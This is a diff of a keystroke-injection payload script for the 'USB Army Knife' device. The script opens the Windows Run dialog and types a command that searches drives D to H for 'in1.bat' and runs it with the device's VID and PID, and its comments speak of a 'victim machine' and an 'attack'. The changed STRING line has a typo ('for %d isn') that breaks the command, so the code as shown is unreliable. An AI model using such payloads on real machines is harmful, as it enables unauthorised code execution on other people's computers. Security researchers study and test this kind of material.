@@ -12,19 +12,24 @@ IF (FILE_EXISTS() == FALSE) THEN
 
   REM Searches each drive for a file name in1.bat. Run it if found
 
-  REM Note: If your payload needs some special chars, you might need to know the language pack of the victim machine.
-  REM Support for language switching isn't complete but we can work around it by injecting raw keypresses
-  REM RAW_HID SHIFT 0x64 as an example
-  REM RAW_HID 0x64
-
   REM Open Run window
   GUI R
   DELAY 1000
 
+  REM We are trying to run the following command
+  REM cmd /c @echo off & for %d in (D E F G H) do if exist %d:\in1.bat %d:\in1.bat #_VID_ #_PID_
+  REM By default the USB Army Knife uses a US keyboard layout and the keycodes for \ are different
+  REM To get this working on a UK layout we have two choices either:
+  REM * Compile in the win_en-GB locale (which we do by default) and then use the 'KEYBOARD_LAYOUT win_en-GB' command
+  REM * Send manual HID codes with RAW_HID SHIFT 0x64
+
+  REM For this example we'll use RAW_HID
+
   REM To run we tell the agent the VID and PID of this device. That way it knows exactly what device to talk to
   REM The interpreter injects some 'constants' like #_VID_ and #_PID_.
   REM This is to keep compatibility with DuckyScript3 but allows us to have dynamic variables we can use in our attack
-  STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:
+
+  STRING cmd /c @echo off & for %d isn (D E F G H) do if exist %d:
   RAW_HID 0x64
   STRING in1.bat %d:
   RAW_HID 0x64
